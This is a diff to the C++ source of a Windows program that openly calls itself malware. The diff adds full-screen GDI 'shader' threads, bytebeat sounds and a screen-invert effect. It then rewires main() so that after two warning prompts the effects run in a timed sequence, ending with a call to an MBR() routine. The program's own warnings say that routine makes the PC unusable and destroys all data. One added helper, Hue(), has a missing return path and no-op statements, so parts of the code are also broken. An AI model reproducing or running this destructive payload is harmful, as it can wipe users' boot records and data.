@@ -315,7 +315,35 @@ namespace Colors
 		return rgb;
 	}
 }
-
+int red, green, blue;
+bool ifcolorblue = false, ifblue = false;
+COLORREF Hue(int length) { //credits to Void_/GetMBR again
+	if (red != length) {
+		red < length; red++;
+		if (ifblue == true) {
+			return RGB(red, 0, length);
+		}
+		else {
+			return RGB(red, 0, 0);
+		}
+	}
+	else {
+		if (green != length) {
+			green < length; green++;
+			return RGB(length, green, 0);
+		}
+		else {
+			if (blue != length) {
+				blue < length; blue++;
+				return RGB(0, length, blue);
+			}
+			else {
+				red = 0; green = 0; blue = 0;
+				ifblue = true;
+			}
+		}
+	}
+}
 typedef union _RGBQUAD {
 	COLORREF rgb;
 	struct {
@@ -488,7 +516,200 @@ VOID WINAPI sound10() {
 	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
 	waveOutClose(hWaveOut);
 }
+VOID WINAPI sound11() {
+	HWAVEOUT hWaveOut = 0;
+	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
+	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
+	char buffer[8000 * 127] = {};
+	for (DWORD t = 0; t < sizeof(buffer); ++t)
+		buffer[t] = static_cast<char>(t >> 6 ^ 5 & 77 | t + (77 ^ t >> 11) - t * ((t % 65 ? 2 : 6) & t >> 11) ^ t << 1 & (t & 598 ? t >> 4 : t >> 5));
 
+	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
+	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutClose(hWaveOut);
+}
+VOID WINAPI sound12() {
+	HWAVEOUT hWaveOut = 0;
+	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
+	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
+	char buffer[8000 * 127] = {};
+	for (DWORD t = 0; t < sizeof(buffer); ++t)
+		buffer[t] = static_cast<char>((t >> 3 | t << 1) + (t >> 13 | t << 55 | t >> 33) | t >> 1 | t << 7);
+
+	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
+	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutClose(hWaveOut);
+}
+VOID WINAPI sound13() {
+	HWAVEOUT hWaveOut = 0;
+	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
+	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
+	char buffer[8000 * 127] = {};
+	for (DWORD t = 0; t < sizeof(buffer); ++t)
+		buffer[t] = static_cast<char>(t * (t >> 7 >> t + t / 2));
+
+	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
+	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutClose(hWaveOut);
+}
+VOID WINAPI sound14() {
+	HWAVEOUT hWaveOut = 0;
+	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
+	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
+	char buffer[8000 * 127] = {};
+	for (DWORD t = 0; t < sizeof(buffer); ++t)
+		buffer[t] = static_cast<char>(t * ((t >> 1 | t >> 100) & 5) & t << 4);
+
+	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
+	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutClose(hWaveOut);
+}
+VOID WINAPI sound15() {
+	HWAVEOUT hWaveOut = 0;
+	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
+	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
+	char buffer[8000 * 127] = {};
+	for (DWORD t = 0; t < sizeof(buffer); ++t)
+		buffer[t] = static_cast<char>(t * (t >> 100 * (t >> 15 | t >> 4)));
+
+	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
+	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutClose(hWaveOut);
+}
+
+/* SHADERS */
+DWORD WINAPI shader1(LPVOID lpParam) {
+	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
+	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
+	BITMAPINFO bmi = { 0 };
+	PRGBQUAD rgbScreen = { 0 };
+	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
+	bmi.bmiHeader.biBitCount = 32;
+	bmi.bmiHeader.biPlanes = 1;
+	bmi.bmiHeader.biWidth = w;
+	bmi.bmiHeader.biHeight = h;
+	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
+	SelectObject(hdcMem, hbmTemp);
+	for (;;) {
+		hdcScreen = GetDC(0);
+		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
+		for (INT i = 0; i < w * h; i++) {
+			INT x = i % w, y = i / w;
+			if (y != 0) rgbScreen[i].rgb += x / y;
+		}
+		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
+		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
+	}
+}
+DWORD WINAPI shader2(LPVOID lpParam) {
+	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
+	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
+	BITMAPINFO bmi = { 0 };
+	PRGBQUAD rgbScreen = { 0 };
+	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
+	bmi.bmiHeader.biBitCount = 32;
+	bmi.bmiHeader.biPlanes = 1;
+	bmi.bmiHeader.biWidth = w;
+	bmi.bmiHeader.biHeight = h;
+	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
+	SelectObject(hdcMem, hbmTemp);
+	for (;;) {
+		hdcScreen = GetDC(0);
+		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
+		for (INT i = 0; i < w * h; i++) {
+			INT x = i % w, y = i / w;
+			rgbScreen[i].rgb += 225;
+		}
+		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 10, SRCCOPY);
+		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, -h + 10, SRCCOPY);
+		Sleep(100);
+		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
+	}
+}
+DWORD WINAPI shader3(LPVOID lpParam) {
+	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
+	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
+	BITMAPINFO bmi = { 0 };
+	PRGBQUAD rgbScreen = { 0 };
+	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
+	bmi.bmiHeader.biBitCount = 32;
+	bmi.bmiHeader.biPlanes = 1;
+	bmi.bmiHeader.biWidth = w;
+	bmi.bmiHeader.biHeight = h;
+	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
+	SelectObject(hdcMem, hbmTemp);
+	for (;;) {
+		hdcScreen = GetDC(0);
+		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
+		for (INT i = 0; i < w * h; i++) {
+			INT x = i % w, y = i / w;
+			rgbScreen[i].rgb += x ^ y;
+		}
+		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 10, SRCCOPY);
+		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, -h + 10, SRCCOPY);
+		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
+	}
+}
+DWORD WINAPI shader4(LPVOID lpParam) {
+	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
+	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
+	BITMAPINFO bmi = { 0 };
+	PRGBQUAD rgbScreen = { 0 };
+	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
+	bmi.bmiHeader.biBitCount = 32;
+	bmi.bmiHeader.biPlanes = 1;
+	bmi.bmiHeader.biWidth = w;
+	bmi.bmiHeader.biHeight = h;
+	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
+	SelectObject(hdcMem, hbmTemp);
+	for (;;) {
+		hdcScreen = GetDC(0);
+		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
+		for (INT i = 0; i < w * h; i++) {
+			INT x = i % w, y = i / w;
+			rgbScreen[i].r += GetRValue(x ^ y);
+			rgbScreen[i].g += GetGValue(x ^ y);
+			rgbScreen[i].b += GetBValue(x ^ y);
+		}
+		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
+		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
+	}
+}
+DWORD WINAPI shader5(LPVOID lpParam) {
+	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
+	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
+	BITMAPINFO bmi = { 0 };
+	PRGBQUAD rgbScreen = { 0 };
+	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
+	bmi.bmiHeader.biBitCount = 32;
+	bmi.bmiHeader.biPlanes = 1;
+	bmi.bmiHeader.biWidth = w;
+	bmi.bmiHeader.biHeight = h;
+	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
+	SelectObject(hdcMem, hbmTemp);
+	for (;;) {
+		hdcScreen = GetDC(0);
+		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
+		for (INT i = 0; i < w * h; i++) {
+			INT x = i % w, y = i / w;
+			rgbScreen[i].r = GetRValue(Hue(239));
+			rgbScreen[i].g = GetGValue(Hue(239));
+			rgbScreen[i].b = GetBValue(Hue(239));
+		}
+		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
+		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
+	}
+}
 
 /* PAYLOADS */
 DWORD WINAPI spiral_screen(LPVOID lpParam) {
@@ -515,7 +736,7 @@ DWORD WINAPI spiral_screen(LPVOID lpParam) {
 
 		BitBlt(desk, ulx, uly, brx, bry, desk, 0, 0, SRCCOPY);
 
-		Sleep(10);
+		Sleep(50);
 	}
 	ReleaseDC(wnd, desk); // Release the device context before exiting
 	return 0;
@@ -551,18 +772,17 @@ DWORD WINAPI PanScreen(LPVOID lpParam) {
 	double dy = 0;
 	double dx = 0;
 	double angle = 0;
-	double size = 1;
 	double speed = 5;
 
 	while (1) {
 		BitBlt(hdc, 0, 0, sw, sh, hdc, dx, dy, SRCCOPY);
-		dx = ceil(sin(angle) * size * 10);
-		dy = ceil(cos(angle) * size * 10);
+		dx = ceil(sin(angle) * 10);
+		dy = ceil(cos(angle) * 10);
 		angle += speed/10;
 		if (angle > atan(1) * 4) {
 			angle = (atan(1) * 4 ) * -1;
 		}
-		Sleep(10);
+		Sleep(50);
 
 	}
 
@@ -588,8 +808,10 @@ DWORD WINAPI xorfractal(LPVOID lpParam) {
 			rgbScreen[i].rgb += x ^ y;
 		}
 		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
+		Sleep(100);
 		ReleaseDC(NULL, hdcScreen);
 		DeleteDC(hdcScreen);
+		Sleep(50);
 	}
 	return 0;
 }
@@ -821,6 +1043,18 @@ DWORD WINAPI bouncing_circles(LPVOID lpParam) {
 		ReleaseDC(0, hdc);
 	}
 }
+DWORD WINAPI Invert(LPVOID lpParam) {
+	HDC hdc;
+	int sw, sh;
+	sw = GetSystemMetrics(0);
+	sh = GetSystemMetrics(1);
+	while (1) {
+		hdc = GetDC(0);
+
+		BitBlt(hdc, 0, 0, sw, sh, hdc, 0, 0, PATINVERT);
+		Sleep(250);
+	}
+}
 DWORD WINAPI KABOOM(LPVOID lpParam)
 {	
 
@@ -851,7 +1085,9 @@ DWORD WINAPI KABOOM(LPVOID lpParam)
 		/* Bouncing circles */
 		HANDLE thread10 = CreateThread(0, 0, bouncing_circles, 0, 0, 0);
 		sound10();
-		
+		/* Invert */
+		HANDLE thread11 = CreateThread(0, 0, Invert, 0, 0, 0);
+		sound11();
 	
 		
 	
@@ -870,7 +1106,8 @@ DWORD WINAPI KABOOM(LPVOID lpParam)
 		CloseHandle(thread3);
 		TerminateThread(thread1, 0);
 		CloseHandle(thread1);
-
+		TerminateThread(thread11, 0);
+		CloseHandle(thread11);
 		
 
 	return 0;
@@ -902,13 +1139,150 @@ INT main() {
 		destructive = true;
 	}
 
-	if (destructive == true)
-	{
-		if (MessageBox(FindWindowA("ConsoleWindowClass", NULL), L"THIS IS MALWARE, THAT WILL MAKE YOUR DEVICE UNUSABLE!\nARE YOU SURE IF YOU WANT TO EXECUTE THIS PROGRAM?", L"WARNING", MB_YESNO | MB_ICONWARNING) == IDYES)
+	
+	
+		if (MessageBox(FindWindowA("ConsoleWindowClass", NULL), L"THIS IS MALWARE, THAT WILL MAKE YOUR DEVICE UNUSABLE! (If you haven't chosen gdi-only mode)\nARE YOU SURE IF YOU WANT TO EXECUTE THIS PROGRAM?", L"WARNING", MB_YESNO | MB_ICONWARNING) == IDYES)
 		{
-			if (MessageBox(FindWindowA("ConsoleWindowClass", NULL), L"LAST WARNING! DO YOU WANT TO RUN THIS PROGRAM?\nALL YOUR DATA WILL BE LOST!\nYOU WILL NOT BE ABLE TO USE YOUR PC AGAIN!", L"WARNING", MB_YESNO | MB_ICONWARNING) == IDYES)
+			if (MessageBox(FindWindowA("ConsoleWindowClass", NULL), L"LAST WARNING! DO YOU WANT TO RUN THIS PROGRAM?\nALL YOUR DATA WILL BE LOST!\nYOU WILL NOT BE ABLE TO USE YOUR PC AGAIN!\n(If you haven't chosen gdi-only mode)", L"WARNING", MB_YESNO | MB_ICONWARNING) == IDYES)
 			{
 
+				/* SHADER 1*/
+				HANDLE t_shader1 = CreateThread(0, 0, shader1, 0, 0, 0);
+				sound11();
+				Sleep(10000);
+				TerminateThread(t_shader1, 0);
+				CloseHandle(t_shader1);
+				InvalidateRect(0, 0, 0);
+
+
+				/* SHAPES */
+				HANDLE thread1 = CreateThread(0, 0, shapes, 0, 0, 0);
+				sound1();
+				Sleep(20000);
+				TerminateThread(thread1, 0);
+				CloseHandle(thread1);
+				
+				/* SCREEN SPIRAL */
+				HANDLE thread2 = CreateThread(0, 0, spiral_screen, 0, 0, 0);
+				sound2();
+				Sleep(10000);
+				TerminateThread(thread2, 0);
+				CloseHandle(thread2);
+				InvalidateRect(0, 0, 0);
+
+				/* Pan Screen */
+				HANDLE thread3 = CreateThread(0, 0, PanScreen, 0, 0, 0);
+				sound3();
+				Sleep(20000);
+				TerminateThread(thread3, 0);
+				CloseHandle(thread3);
+
+				/* SHADER 2*/
+				HANDLE t_shader2 = CreateThread(0, 0, shader2, 0, 0, 0);
+				sound12();
+				Sleep(30000);
+				TerminateThread(t_shader2, 0);
+				CloseHandle(t_shader2);
+				
+
+				/* XOR fractal */
+				HANDLE thread4 = CreateThread(0, 0, xorfractal, 0, 0, 0);
+				sound4();
+				Sleep(30000);
+				TerminateThread(thread4, 0);
+				CloseHandle(thread4);
+
+				/* Invert */
+				HANDLE thread12 = CreateThread(0, 0, Invert, 0, 0, 0);
+				sound11();
+				Sleep(30000);
+				TerminateThread(thread12, 0);
+				CloseHandle(thread12);
+
+				/* Reverse Tunnel */
+				HANDLE thread5 = CreateThread(0, 0, rev_tunnel, 0, 0, 0);
+				sound5();
+				Sleep(20000);
+				TerminateThread(thread5, 0);
+				CloseHandle(thread5);
+				InvalidateRect(0, 0, 0);
+
+				/* SHADER 3*/
+				HANDLE t_shader3 = CreateThread(0, 0, shader3, 0, 0, 0);
+				sound13();
+				Sleep(20000);
+				TerminateThread(t_shader3, 0);
+				CloseHandle(t_shader3);
+				
+
+
+				/* Text */
+				HANDLE thread6 = CreateThread(0, 0, text, 0, 0, 0);
+				sound6();
+				Sleep(30000);
+				TerminateThread(thread6, 0);
+				CloseHandle(thread6);
+
+				/* Mandelbrot! */
+				HANDLE thread7 = CreateThread(0, 0, mandelbrot, 0, 0, 0);
+				sound7();
+				Sleep(40000);
+				TerminateThread(thread7, 0);
+				CloseHandle(thread7);
+				InvalidateRect(0, 0, 0);
+
+				/* SHADER 4*/
+				HANDLE t_shader4 = CreateThread(0, 0, shader4, 0, 0, 0);
+				sound14();
+				Sleep(20000);
+				TerminateThread(t_shader4, 0);
+				CloseHandle(t_shader4);
+				
+				/* 3D cube! */
+				HANDLE thread8 = CreateThread(0, 0, RotateCubeThread, 0, 0, 0);
+				sound8();
+				Sleep(20000);
+				TerminateThread(thread8, 0);
+				CloseHandle(thread8);
+				InvalidateRect(0, 0, 0);
+
+
+				/* Gdi hell */
+				HANDLE thread9 = CreateThread(0, 0, gdihell, 0, 0, 0);
+				sound9();
+				Sleep(30000);
+				TerminateThread(thread9, 0);
+				CloseHandle(thread9);
+
+				/* SHADER 5*/
+				HANDLE t_shader5 = CreateThread(0, 0, shader5, 0, 0, 0);
+				sound15();
+				Sleep(20000);
+				TerminateThread(t_shader5, 0);
+				CloseHandle(t_shader5);
+
+				/* Bouncing circles */
+				HANDLE thread10 = CreateThread(0, 0, bouncing_circles, 0, 0, 0);
+				sound10();
+				Sleep(40000);
+				TerminateThread(thread10, 0);
+				CloseHandle(thread10);
+				InvalidateRect(0, 0, 0);
+				Sleep(5000);
+
+				/* KABOOM */
+				HANDLE thread11 = CreateThread(0, 0, KABOOM, 0, 0, 0);
+				Sleep(500000);
+
+				TerminateThread(thread11, 0);
+				CloseHandle(thread11);
+
+				/* MBR */
+				if (destructive == true)
+				{
+					MBR();
+
+				}
 			}
 			else
 			{
@@ -920,99 +1294,10 @@ INT main() {
 			return 0;
 		}
 		
-	}
 	
 	
-		/* SHAPES */
-		HANDLE thread1 = CreateThread(0, 0, shapes, 0, 0, 0);
-		sound1();
-		Sleep(20000);
-		TerminateThread(thread1, 0);
-		CloseHandle(thread1);
-
-		/* SCREEN SPIRAL */
-		HANDLE thread2 = CreateThread(0, 0, spiral_screen, 0, 0, 0);
-		sound2();
-		Sleep(10000);
-		TerminateThread(thread2, 0);
-		CloseHandle(thread2);
-		InvalidateRect(0, 0, 0);
-
-		/* Pan Screen */
-		HANDLE thread3 = CreateThread(0, 0, PanScreen, 0, 0, 0);
-		sound3();
-		Sleep(20000);
-		TerminateThread(thread3, 0);
-		CloseHandle(thread3);
-
-
-		/* XOR fractal */
-		HANDLE thread4 = CreateThread(0, 0, xorfractal, 0, 0, 0);
-		sound4();
-		Sleep(30000);
-		TerminateThread(thread4, 0);
-		CloseHandle(thread4);
-
-		/* Reverse Tunnel */
-		HANDLE thread5 = CreateThread(0, 0, rev_tunnel, 0, 0, 0);
-		sound5();
-		Sleep(8000);
-		TerminateThread(thread5, 0);
-		CloseHandle(thread5);
-		InvalidateRect(0, 0, 0);
-
-		/* Text */
-		HANDLE thread6 = CreateThread(0, 0, text, 0, 0, 0);
-		sound6();
-		Sleep(30000);
-		TerminateThread(thread6, 0);
-		CloseHandle(thread6);
-
-		/* Mandelbrot! */
-		HANDLE thread7 = CreateThread(0, 0, mandelbrot, 0, 0, 0);
-		sound7();
-		Sleep(40000);
-		TerminateThread(thread7, 0);
-		CloseHandle(thread7);
-		InvalidateRect(0, 0, 0);
-
-		/* 3D cube! */
-		HANDLE thread8 = CreateThread(0, 0, RotateCubeThread, 0, 0, 0);
-		sound8();
-		Sleep(20000);
-		TerminateThread(thread8, 0);
-		CloseHandle(thread8);
-		InvalidateRect(0, 0, 0);
-
-
-		/* Gdi hell */
-		HANDLE thread9 = CreateThread(0, 0, gdihell, 0, 0, 0);
-		sound9();
-		Sleep(30000);
-		TerminateThread(thread9, 0);
-		CloseHandle(thread9);
-
-		/* Bouncing circles */
-		HANDLE thread10 = CreateThread(0, 0, bouncing_circles, 0, 0, 0);
-		sound10();
-		Sleep(40000);
-		TerminateThread(thread10, 0);
-		CloseHandle(thread10);
-		InvalidateRect(0, 0, 0);
-		Sleep(5000);
-
-		/* KABOOM */
-		HANDLE thread11 = CreateThread(0, 0, KABOOM, 0, 0, 0);
-		Sleep(500000);
-
-		TerminateThread(thread11, 0);
-		CloseHandle(thread11);
-
-		/* MBR */
-		if(destructive == true)
-		{
-			MBR();
-		}
+	
+		
 		return 0;
 	
 }
